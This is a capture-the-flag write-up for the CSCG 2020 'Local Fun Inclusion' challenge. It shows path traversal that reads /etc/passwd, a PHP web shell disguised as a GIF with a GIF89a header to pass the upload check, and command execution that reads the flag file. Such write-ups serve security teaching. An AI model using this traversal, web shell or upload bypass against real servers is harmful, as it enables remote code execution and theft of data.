# Local Fun Inclusion

Local Fun Inclusion was a web challenge in the CSCG 2020.
The name is clearly a hint on the common [Local file Inclusion](https://en.wikipedia.org/wiki/File_inclusion_vulnerability) vulnerability.
On the supplied URL we can find a website on which we can upload an image and view the uploaded image. But first of all let's test the LFI attack if we visit http://lfi.hax1.allesctf.net:8081/index.php?site=../../../etc/passwd, we are ganted with the `/etc/passwd` file, so the LFI acutally works. The idea now is to somehow upload some kind of shell or other php payload to the server and execute it. Luckily there is a way how we can upload a file. But there a few restrictions. For example if we try to upload:
`payload1.php`
```
<?php system($_GET["c"]); ?>
```
We get the error : `Invalid image extension!` But changing the extension doesn't help much. `payload2.gif` : `Only pictures allowed!`
So we have to make the server believe, that the payload we upload is a legit image. Luckily there is a very simple way : If we preped `GIF89a` to any file, the file command thinks it is a gif image.
`payload3.gif`:
```
GIF89a
<?php system($_GET["c"]); ?>
```
That got uploaded! Now we can change the `site` get parameter to our image and the code we supplied get executed.
And using the `c` parameter we can execute shell commands.
`ls` shows, that there is a file called `flag.php`, but if try to `cat flag.php`, we don't see any output, that's because it contains php code which gets executed and doesn't get echoed. But there is a simple way around that `base64 flag.php` echos the base64 encoded file. We can decode that localy and get:
```
<?php

$FLAG = "CSCG{G3tting_RCE_0n_w3b_is_alw4ys_cool}";
```
